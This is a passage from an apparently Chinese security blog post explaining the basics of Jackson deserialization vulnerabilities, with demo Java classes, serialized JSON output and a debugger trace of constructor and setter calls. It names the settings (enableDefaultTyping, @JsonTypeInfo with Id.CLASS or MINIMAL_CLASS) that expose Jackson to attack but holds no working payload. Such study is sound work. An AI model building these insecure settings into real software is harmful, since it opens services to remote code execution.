class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    <span class="keyword">public</span> Hacker hacker;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s, %s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex, hacker == <span class="keyword">null</span> ? <span class="string">"null"</span> : hacker);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        p.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        p.hacker = <span class="keyword">new</span> Hacker();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置NON_FINAL</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，成功对非final的hacker属性进行序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"Person"</span>,&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;],<span class="attr">"sex"</span>:[<span class="string">"com.mi1k7ea.MySex"</span>,&#123;<span class="attr">"sex"</span>:<span class="number">0</span>&#125;],<span class="attr">"hacker"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;]&#125;]</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@62ee68d8, com.mi1k7ea.MySex@735b5592, com.mi1k7ea.Hacker@58651fd0</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>从前面的分析知道，DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="@JsonTypeInfo注解"></a>@JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CUSTOM)</span><br></pre></td></tr></table></figure><p>下面我们逐个看下。</p><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类，给object属性添加@JsonTypeInfo注解，指定为JsonTypeInfo.Id.NONE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, &#123;skill=Jackson&#125;</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。</p><p>输出看到，object属性中多了”@class”:”com.mi1k7ea.Hacker”，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"@class"</span>:<span class="string">"com.mi1k7ea.Hacker"</span>,<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@1d057a39</span><br></pre></td></tr></table></figure><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。</p><p>输出看到，object属性中多了”@c”:”com.mi1k7ea.Hacker”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"@c"</span>:<span class="string">"com.mi1k7ea.Hacker"</span>,<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@4c70fda8</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。</p><p>输出看到，object属性中多了”@type”:”Hacker”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"@type"</span>:<span class="string">"Hacker"</span>,<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Exception in thread "main" com.fasterxml.jackson.databind.JsonMappingException: Could not resolve type id 'Hacker' into a subtype of [simple type, class java.lang.Object]: known type ids = [Object]</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalStateException: Do not know how to construct standard type id resolver for idType: CUSTOM</span><br></pre></td></tr></table></figure><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>由前面测试发现，当@JsonTypeInfo注解设置为如下值之一并且修饰的是Object类型的属性时，可以利用来触发Jackson反序列化漏洞：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><h2 id="0x04-反序列化中类属性方法的调用"><a href="#0x04-反序列化中类属性方法的调用" class="headerlink" title="0x04 反序列化中类属性方法的调用"></a>0x04 反序列化中类属性方法的调用</h2><p>这里只针对Jackson反序列化过程中存在的一些方法调用进行分析，并且只针对应用JacksonPolymorphicDeserialization机制的场景进行分析。</p><p>下面简单看下两个实现方式间是否有区别。</p><h3 id="当使用DefaultTyping时"><a href="#当使用DefaultTyping时" class="headerlink" title="当使用DefaultTyping时"></a>当使用DefaultTyping时</h3><p>修改Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在MySex类中的方法中添加输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MySex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.getSex"</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.setSex"</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java，只进行反序列化操作并调用无参数的enableDefaultTyping()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":1&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，看到调用了目标类的构造函数和setter方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.MySex@153f5a29</span><br></pre></td></tr></table></figure><h3 id="当使用-JsonTypeInfo注解时"><a href="#当使用-JsonTypeInfo注解时" class="headerlink" title="当使用@JsonTypeInfo注解时"></a>当使用@JsonTypeInfo注解时</h3><p>修改Person类，在sex属性前添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java，注释掉enableDefaultTyping()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"><span class="comment">//        mapper.enableDefaultTyping();</span></span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":1&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和使用DefaultTyping是一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.MySex@5ae9a829</span><br></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>Jackson反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</p><p>这里以第一个例子来进行Jackson反序列化过程的调试分析，在<code>Person p2 = mapper.readValue(json, Person.class);</code>处打上断点，同时在MySex类的构造函数、getter、setter方法中设置断点，然后开始调试。</p><p>另外，为了方便，给Person类加上个构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BeanDeserializer.deserialize()函数中，调用了vanillaDeserialize()函数：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/1.png" alt=""></p><p>跟进去，BeanDeserializer.vanillaDeserialize()函数的实现比较简单，先调用createUsingDefault()函数来调用指定类的无参构造函数来生成类实例：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/2.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/3.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/4.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/5.png" alt=""></p><p>BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/6.png" alt=""></p><p>跟进去FieldProperty.deserializeAndSet()函数中，发现调用了deserialize()函数：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/7.png" alt=""></p><p>跟进该SettableBeanProperty.deserialize()函数，可以看到有两个反序列化的代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/8.png" alt=""></p><p>这里第一个属性是age，属于Int类型，因此调用的是NumberDeserializers.deserialize()函数来获取age属性的值：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/11.png" alt=""></p><p>反序列化解析得到属性值之后，回到FieldProperty.deserializeAndSet()函数中，调用属性的setter方法来设置Bean的属性值：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/9.png" alt=""></p><p>接着就是回到BeanDeserializer.vanillaDeserialize()函数中的do while循环中继续解析name、sex等属性内容。</p><p>name和前面age一样的调用过程，sex属性值是包含类名的数组，因此直接调试到解析sex属性时看到，在SettableBeanProperty.deserialize()函数中进入到了调用deserializeWithType()函数解析的代码逻辑，因为此时_valueTypeDeserializer值不为null：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/12.png" alt=""></p><p>跟进AbstractDeserializer.deserializeWithType()函数中，进一步调用了AsArrayTypeDeserializer.deserializeTypedFromObject()函数来解析：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/13.png" alt=""></p><p>跟进去，看到调用<code>_locateTypeId()</code>函数获取到了typeId为”com.mi1k7ea.MySex”即已经获取到我们的类型名称，然后根据该typeId调用<code>_findDeserializer()</code>函数寻找对应的反序列化器：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/14.png" alt=""></p><p>跟进去，其中调用findContextualValueDeserializer()找到typeId类型对应的反序列化器，然后缓存到_deserializers这个Map变量中，然后返回该反序列化器：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/15.png" alt=""></p><p>接着程序回到数组类型解析的AsArrayTypeDeserializer._deserialize()函数中往下执行，用刚刚获取到的反序列化器来解析sex属性中数组内的具体类型实例：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/16.png" alt=""></p><p>然后会再次调用BeanDeserializer.deserialize()-&gt;BeanDeserializer.vanillaDeserialize()来解析数组内的内容，其中调用createUsingDefault()函数的时候会调用到MySex类的无参构造函数来新建MySex类对象：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/17.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/18.png" alt=""></p><p>获取到MySex类对象后，回到vanillaDeserialize()函数中扫描到该类对象的sex属性后，调用deserializeAndSet()函数获取该属性值并设置到该实例中：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/19.png" alt=""></p><p>跟进MethodProperty.deserializeAndSet()函数，先是获取sex属性值，其调用过程和前面一样；然后就是通过反射机制调用该属性的setter方法进行设置：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/20.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/21.png" alt=""></p><p>至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo注解的函数调用过程也是一样的。</p><p>简单梳理一遍，Jackson反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。</p><p>调用到MySex类的构造函数时的函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:6, MySex (com.mi1k7ea)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call:119, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createUsingDefault:243, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">vanillaDeserialize:249, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromObject:58, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:142, AbstractDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserializeAndSet:101, FieldProperty 